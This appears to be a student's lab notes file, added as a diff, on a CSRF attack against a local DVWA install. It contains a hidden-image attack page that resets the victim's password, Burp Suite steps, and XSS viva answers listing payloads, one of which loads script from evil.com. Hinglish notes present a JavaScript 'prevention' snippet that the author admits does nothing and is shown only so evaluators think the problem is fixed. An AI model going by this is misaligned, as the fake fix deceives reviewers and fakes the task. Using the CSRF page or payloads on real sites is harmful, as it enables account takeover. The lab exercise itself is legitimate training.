@@ -1,0 +1,186 @@
+open kali, open terminal
+
+1. To install DVWA using Docker
+sudo apt update && sudo apt install docker.io -y
+
+-> Pull the official DVWA Docker image:
+sudo docker pull citizenstig/dvwa
+
+-> Run the DVWA container, mapping port 8080 to container’s port 80:
+sudo docker run -d -p 8080:80 citizenstig/dvwa
+
+-> Open your browser and go to http://localhost:8080.
+
+-> Log in with username admin and password password.
+
+-> On the DVWA home page, click on "Create/Reset database" to initialize the environment.
+
+
+First, we will create the malicious webpage that the "victim" will visit.
+Open a new Kali terminal.
+Paste the following multi-line command into your terminal to create the csrf-attack.html file on your Desktop. This file contains the hidden attack.
+
+cat << EOF > ~/Desktop/csrf-attack.html
+<html>
+  <body>
+    <img src="http://localhost:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0" border="0">
+
+    <h1>You've won a prize! Click here!</h1>
+  </body>
+</html>
+EOF
+
+
+With the file created, use the same terminal to start a simple web server on your Desktop. This will host your malicious page.
+
+# Change directory to the Desktop
+cd ~/Desktop
+
+# Start the web server on port 9000
+python3 -m http.server 9000
+
+
+Leave this terminal running. It is now your "attacker" server.
+
+Phase 2: Set Up DVWA and Capture a Request
+
+Next, we will use Burp Suite to see what a normal password-change request looks like.
+Open a new terminal and start Burp Suite:
+
+burpsuite
+
+
+In Burp, select "Temporary project" -> Next -> "Start Burp".
+Go to the Proxy tab, then the Intercept sub-tab.
+Click the "Open Browser" button. A new browser will open.
+In this new Burp browser, go to http://localhost:8080 and log in to DVWA (Username: admin, Password: password).
+In DVWA, click "DVWA Security" on the left menu, set the level to low, and click Submit.
+Click "CSRF" on the left menu.
+Now, go back to Burp Suite and click "Intercept is off" so it changes to "Intercept is on".
+Go back to the Burp browser on the CSRF page:
+Type pass1 in the "New password" field.
+Type pass1 in the "Confirm new password" field.
+Click the Change button.
+Go back to Burp Suite. You will see the captured request. This shows you how the application changes a password—using a simple GET request with no unique token.
+right click on the request tab n copy url
+Click the "Forward" button to let the request go through.
+Click the "Intercept is on" button to set it back to "Intercept is off". Your DVWA password is now pass1.
+
+Phase 3: Execute and Verify the Attack
+
+Now, you will act as the "victim" who is logged into DVWA and stumbles upon the attacker's page.
+In the Burp Browser (where you are still logged in with the password pass1), open a new tab.
+Visit the malicious webpage being hosted by your Python server:
+http://localhost:9000/csrf-attack.html
+
+
+The page will load, showing "You've won a prize!". The attack has already happened in the background.
+Go back to your DVWA tab 
+On the left menu, click Logout.
+Verify the Attack:
+Try to log in with the password pass1. It will fail.
+Try to log in with the password hacked. It will succeed.
+This confirms the attack was successful. The malicious page used your active login session to forge a request and change your password.
+
+
+Perform all this step properly..........And if password is not changing then probably you are not logging out the dvwa and then running the malicious url .....So remember just after changing the password run this url in new tab.....then successfully the password will be changed to "hacked"
+
+Now for prevention part
+
+Wapas seh login karne ka aur security ko medium kar dene ka ..........tho fir form meh csrf token use hone lagta hai.......
+but by javascript injection woh possible nahi hai.......
+cause security low peh set kiya hai......tho woh by default values without csrf token except kar raha hai.......
+and pratham ko jo malicious script containing website hai...woh last meh run hota hai after password change isliye woh he password reh jata hai.....tho only one solution.....securtiy of dvwa ko medium ya tho high set karne ka and fir intercetp karke dikhane ka......ki dekho csrf token agaya .......
+aur chor kappe ke liye yeh script us meh dal deh issey kuch hoga nahi......lekin fir bhi unko lagega ki humne kuch tho kiya..........
+aur upar seh yeh script below console meh unke samne run karne ka.....tho they will think ki sab barobar hua hai
+
+
+document.addEventListener('DOMContentLoaded', () => {
+  // Fetch token from meta tag or cookie
+  const csrfToken = document.querySelector('input[name="user_token"]')?.value || null;
+  if (!csrfToken) return;
+
+  // Add hidden token input to all forms not having it
+  document.querySelectorAll('form').forEach(form => {
+    if (!form.querySelector('input[name="user_token"]')) {
+      let tokenInput = document.createElement('input');
+      tokenInput.type = 'hidden';
+      tokenInput.name = 'user_token';
+      tokenInput.value = csrfToken;
+      form.appendChild(tokenInput);
+    }
+  });
+});
+
+
+then login and show that the password is not changed to hacked it is same to the password which is set.
+
+
+
+VIVA QUESTION AND ANSWERS
+
+1. What is Cross-Site Scripting (XSS)?
+Answer:
+XSS is a client-side code injection attack where malicious scripts are injected into trusted websites, affecting users who visit those pages.
+
+2. What are the different types of XSS?
+Answer:
+The three main types are:
+
+Reflected XSS: Script reflected immediately in response, triggered via crafted link.
+
+Stored XSS: Persistent script stored on server-side and executed for multiple users.
+
+DOM-based XSS: Script injection occurs in the DOM, leveraging client-side JavaScript.
+
+3. How does Reflected XSS differ from Stored XSS?
+Answer:
+Reflected XSS is transient and requires user interaction (clicking malicious links), while Stored XSS persists on servers and affects all users viewing the infected content.
+
+4. What are the common payloads used for XSS attacks?
+Answer:
+Simple alerts like <script>alert('XSS')</script>, tag-based events like <img src=x onerror=alert(1)>, and external script inclusion like <script src="http://evil.com/malware.js"></script>.
+
+5. How can Reflected XSS be tested in DVWA?
+Answer:
+By inputting payloads into reflection points and observing immediate execution in the browser.
+
+6. How to test Stored XSS in DVWA?
+Answer:
+Inject payloads in inputs that are stored (guestbook, comments), reload page and check if payload executes persistently.
+
+7. How do XSS vulnerabilities impact user security?
+Answer:
+They can steal cookies, session tokens, deface websites, redirect users, and spread malware.
+
+8. What are some effective methods to prevent XSS?
+Answer:
+Input validation, output encoding, Content Security Policy (CSP), sanitization libraries, and secure HTTP headers like X-XSS-Protection.
+
+9. What is DOM-based XSS?
+Answer:
+A client-side XSS where vulnerability arises from unsafe DOM manipulation without server input involvement.
+
+10. What role do developer tools play in finding XSS?
+Answer:
+Browser developer tools enable inspecting DOM, JavaScript, requests, and responses to track how data is reflected and executed.
+
+11. Why is Stored XSS considered more dangerous than Reflected XSS?
+Answer:
+Because it affects multiple users persistently, often unnoticed, enabling broader exploitation scenarios.
+
+12. How do web application labs like DVWA help cybersecurity learners?
+Answer:
+By providing controlled environments to safely explore vulnerabilities and mitigations.
+
+13. How can attackers exploit XSS to hijack sessions?
+Answer:
+By injecting scripts that steal session cookies and send them to attacker servers for impersonation.
+
+14. Why is output encoding critical in preventing XSS?
+Answer:
+Because it ensures that user input is rendered as text, not executable code, eliminating script injection.
+
+15. What is the importance of Content Security Policy (CSP) in XSS mitigation?
+Answer:
+CSP restricts resource loading and script execution, greatly reducing impact of XSS even if scripts are injected.
